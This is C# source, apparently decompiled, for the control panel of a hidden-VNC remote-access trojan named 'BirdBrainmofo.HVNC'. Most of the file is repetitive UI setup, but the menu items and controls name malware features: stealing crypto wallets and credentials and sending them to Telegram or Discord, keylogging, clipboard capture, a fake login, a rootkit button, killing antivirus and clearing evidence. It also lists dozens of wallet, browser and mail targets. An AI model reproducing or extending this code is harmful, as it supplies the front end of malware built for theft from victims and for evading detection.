using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using BirdBrainmofo.HVNC.Controls;
using BirdBrainmofo.HVNC.Properties;
using BirdBrainmofo.Zeroit.Framework.UIThemes.Ambience;
using GMap.NET;
using GMap.NET.MapProviders;
using GMap.NET.WindowsForms;
using GMap.NET.WindowsForms.Markers;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Timer = System.Windows.Forms.Timer;

namespace BirdBrainmofo.HVNC
{
	// Token: 0x02000099 RID: 153
	public class hVNC : Form
	{

        private IContainer components = null;

        // Token: 0x0600075D RID: 1885 RVA: 0x00048168 File Offset: 0x00046368
        public static string RandomMutex(int length)
		{
			return new string((from string_0 in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length)
				select string_0[random.Next(string_0.Length)]).ToArray());
		}

        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        // Token: 0x060007E3 RID: 2019 RVA: 0x0004A588 File Offset: 0x00048788
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            BirdBrainmofo.Bloom bloom1 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom2 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom3 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom4 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom5 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom6 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom7 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom8 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom9 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom10 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom11 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom12 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom13 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom14 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom15 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom16 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom17 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom18 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom19 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom20 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom21 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom22 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom23 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom24 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom25 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom26 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom27 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom28 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom29 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom30 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom31 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom32 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom33 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom34 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom35 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom36 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom37 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom38 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom39 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom40 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom41 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom42 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom43 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom44 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom45 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom46 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom47 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom48 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom49 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom50 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom51 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom52 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom53 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom54 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom55 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom56 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom57 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom58 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom59 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom60 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom61 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom62 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom63 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom64 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom65 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom66 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom67 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom68 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom69 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom70 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom71 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom72 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom73 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom74 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom75 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom76 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom77 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom78 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom79 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom80 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom81 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom82 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom83 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom84 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom85 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom86 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom87 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom88 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom89 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom90 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom91 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom92 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom93 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom94 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom95 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom96 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom97 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom98 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom99 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom100 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom101 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom102 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom103 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom104 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom105 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom106 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom107 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom108 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom109 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom110 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom111 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom112 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom113 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom114 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom115 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom116 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom117 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom118 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom119 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom120 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom121 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom122 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom123 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom124 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom125 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom126 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom127 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom128 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom129 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom130 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom131 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom132 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom133 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom134 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom135 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom136 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom137 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom138 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom139 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom140 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom141 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom142 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom143 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom144 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom145 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom146 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom147 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom148 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom149 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom150 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom151 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom152 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom153 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom154 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom155 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom156 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom157 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom158 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom159 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom160 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom161 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom162 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom163 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom164 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom165 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom166 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom167 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom168 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom169 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom170 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom171 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom172 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom173 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom174 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom175 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom176 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom177 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom178 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom179 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom180 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom181 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom182 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom183 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom184 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom185 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom186 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom187 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom188 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom189 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom190 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom191 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom192 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom193 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom194 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom195 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom196 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom197 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom198 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom199 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom200 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom201 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom202 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom203 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom204 = new BirdBrainmofo.Bloom();
            BirdBrainmofo.Bloom bloom205 = new BirdBrainmofo.Bloom();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(hVNC));
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.closeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.contextMenuStrip2 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.electrumToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.armoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.GuardaItem = new System.Windows.Forms.ToolStripMenuItem();
            this.coinomiToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.exodusToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.atomicToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.jaxxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.contextMenuStrip3 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.outlookToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.foxmailToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.thunderbirdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.skypeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.discordToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.telegramToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.dingTalkToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.contextMenuStrip4 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.btnChrome = new System.Windows.Forms.ToolStripMenuItem();
            this.btnEdge = new System.Windows.Forms.ToolStripMenuItem();
            this.btnFirefox = new System.Windows.Forms.ToolStripMenuItem();
            this.btnBrave = new System.Windows.Forms.ToolStripMenuItem();
            this.btnEpic = new System.Windows.Forms.ToolStripMenuItem();
            this.btnVivaldi = new System.Windows.Forms.ToolStripMenuItem();
            this.btn360 = new System.Windows.Forms.ToolStripMenuItem();
            this.btnSputnik = new System.Windows.Forms.ToolStripMenuItem();
            this.comodoToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.yandexToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.operaNeonToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.waterFoxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.orbitumToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.atomToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.slimjetToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.contextMenuStrip5 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.msinfo32exeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mstscexeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.notepadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.controlPanelToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.powershellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cMDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.explorerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.pasteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fakeLoginToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.killAllAntivusesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.timer3 = new System.Windows.Forms.Timer(this.components);
            this.contextMenuStrip6 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.stealAndSendToTelegramToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.stealAndSendToDiscordToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.downloadLogsViaSocketToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.clearEvidenceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.stealAllWalletsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
            this.chkInfo = new JCS.ToggleSwitch();
            this.chkKeylog = new JCS.ToggleSwitch();
            this.chkClip = new JCS.ToggleSwitch();
            this.studioButton7 = new BirdBrainmofo.StudioButton();
            this.studioButton9 = new BirdBrainmofo.StudioButton();
            this.chkClone = new JCS.ToggleSwitch();
            this.btnRootkit = new BirdBrainmofo.StudioButton();
            this.timer4 = new System.Windows.Forms.Timer(this.components);
            this.contextMenuStrip7 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.startToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.stopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.timer5 = new System.Windows.Forms.Timer(this.components);
            this.timer6 = new System.Windows.Forms.Timer(this.components);
            this.timer7 = new System.Windows.Forms.Timer(this.components);
            this.timer8 = new System.Windows.Forms.Timer(this.components);
            this.timer9 = new System.Windows.Forms.Timer(this.components);
            this.FileManagerContextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.networkingToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.downloadFIleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uploadFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
            this.executeFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.createDirectoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.refreshDirectoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
            this.deleteFolderFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cryptographyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.encryptFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.decryptFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.blockFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
            this.searchDirectoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.searchForFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.FileManagerImageList = new System.Windows.Forms.ImageList(this.components);
            this.timer10 = new System.Windows.Forms.Timer(this.components);
            this.timer11 = new System.Windows.Forms.Timer(this.components);
            this.primeTheme1 = new BirdBrainmofo.PrimeTheme();
            this.panel1 = new System.Windows.Forms.Panel();
            this.label18 = new System.Windows.Forms.Label();
            this.btnKeyl = new BirdBrainmofo.StudioButton();
            this.MinBtn = new System.Windows.Forms.Button();
            this.label2 = new System.Windows.Forms.Label();
            this.ResizeLabel = new System.Windows.Forms.Label();
            this.ResizeScroll = new System.Windows.Forms.TrackBar();
            this.label4 = new System.Windows.Forms.Label();
            this.label1 = new System.Windows.Forms.Label();
            this.studioButton11 = new BirdBrainmofo.StudioButton();
            this.CloseBtn = new System.Windows.Forms.Button();
            this.studioButton10 = new BirdBrainmofo.StudioButton();
            this.RestoreMaxBtn = new System.Windows.Forms.Button();
            this.studioButton8 = new BirdBrainmofo.StudioButton();
            this.studioButton1 = new BirdBrainmofo.StudioButton();
            this.studioButton6 = new BirdBrainmofo.StudioButton();
            this.btnWatcher = new BirdBrainmofo.StudioButton();
            this.btnElectrum = new BirdBrainmofo.StudioButton();
            this.txtScreen = new System.Windows.Forms.Label();
            this.txtFPS = new System.Windows.Forms.Label();
            this.studioButton2 = new BirdBrainmofo.StudioButton();
            this.studioButton5 = new BirdBrainmofo.StudioButton();
            this.studioButton4 = new BirdBrainmofo.StudioButton();
            this.studioButton3 = new BirdBrainmofo.StudioButton();
            this.label3 = new System.Windows.Forms.Label();
            this.ambianceTabControl1 = new BirdBrainmofo.Zeroit.Framework.UIThemes.Ambience.AmbianceTabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.VNCBox = new System.Windows.Forms.PictureBox();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.txtBitapp = new System.Windows.Forms.Label();
            this.txtCoin98 = new System.Windows.Forms.Label();
            this.txtEqual = new System.Windows.Forms.Label();
            this.txtMetamask = new System.Windows.Forms.Label();
            this.txtJaxx = new System.Windows.Forms.Label();
            this.txtKeplr = new System.Windows.Forms.Label();
            this.txtCrocobit = new System.Windows.Forms.Label();
            this.txtOxygen = new System.Windows.Forms.Label();
            this.txtGuarda = new System.Windows.Forms.Label();
            this.txtBytecoin = new System.Windows.Forms.Label();
            this.txtMobox = new System.Windows.Forms.Label();
            this.txtGuild = new System.Windows.Forms.Label();
            this.txtIconex = new System.Windows.Forms.Label();
            this.txtTon = new System.Windows.Forms.Label();
            this.txtCoinomi = new System.Windows.Forms.Label();
            this.txtSollet = new System.Windows.Forms.Label();
            this.txtSlope = new System.Windows.Forms.Label();
            this.txtStarcoin = new System.Windows.Forms.Label();
            this.txtPhantom = new System.Windows.Forms.Label();
            this.txtArmory = new System.Windows.Forms.Label();
            this.txtFinnie = new System.Windows.Forms.Label();
            this.txtBinance = new System.Windows.Forms.Label();
            this.txtXinPay = new System.Windows.Forms.Label();
            this.txtMath = new System.Windows.Forms.Label();
            this.txtExodus = new System.Windows.Forms.Label();
            this.txtLiquality = new System.Windows.Forms.Label();
            this.txtTron = new System.Windows.Forms.Label();
            this.txtSwash = new System.Windows.Forms.Label();
            this.txtNifty = new System.Windows.Forms.Label();
            this.txtzcash = new System.Windows.Forms.Label();
            this.rjCircularPictureBox31 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox30 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox29 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox28 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox27 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox26 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.label35 = new System.Windows.Forms.Label();
            this.rjCircularPictureBox25 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox24 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox23 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox22 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox21 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox20 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox19 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox18 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox17 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox16 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox15 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox14 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox13 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox12 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox9 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox10 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox11 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox6 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox7 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox5 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox4 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox3 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
